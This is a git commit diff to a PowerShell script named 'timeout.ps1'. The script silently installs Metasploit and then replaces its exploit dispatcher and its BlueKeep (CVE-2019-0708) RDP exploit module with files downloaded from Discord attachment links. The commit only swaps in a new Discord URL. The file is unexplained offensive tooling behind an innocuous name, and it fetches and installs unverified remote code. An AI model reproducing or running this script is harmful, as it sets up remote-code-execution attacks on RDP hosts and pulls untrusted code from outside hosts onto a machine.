ce12ba746222f7d4172cfaad667feaa5596e1ec1
dokatka <73672976+dokatka@users.noreply.github.com>
2021-03-22 14:37:09 +0300

    Update timeout.ps1

--- timeout.ps1
+++ timeout.ps1
@@ -2,7 +2,7 @@ $WebClient = New-Object System.Net.WebClient
 $WebClient.DownloadFile("https://windows.metasploit.com/metasploitframework-latest.msi","C:\msf.msi")
 msiexec /i C:\msf.msi /qn /norestart
 while (!(Test-Path "C:\metasploit-framework\embedded\framework\lib\msf\ui\console\command_dispatcher\exploit.rb")) { Start-Sleep 10 }
-$WebClient.DownloadFile("https://cdn.discordapp.com/attachments/667336365662535680/823167889191731220/exploit.rb","C:\metasploit-framework\embedded\framework\lib\msf\ui\console\command_dispatcher\exploit.rb")
+$WebClient.DownloadFile("https://cdn.discordapp.com/attachments/667336365662535680/823520573283237908/exploit.rb","C:\metasploit-framework\embedded\framework\lib\msf\ui\console\command_dispatcher\exploit.rb")
 while (!(Test-Path "C:\metasploit-framework\embedded\framework\modules\exploits\windows\rdp\cve_2019_0708_bluekeep_rce.rb")) { Start-Sleep 10 }
 $WebClient.DownloadFile("https://cdn.discordapp.com/attachments/667336365662535680/823214074632470538/cve_2019_0708_bluekeep_rce.rb.txt","C:\metasploit-framework\embedded\framework\modules\exploits\windows\rdp\cve_2019_0708_bluekeep_rce.rb")
 
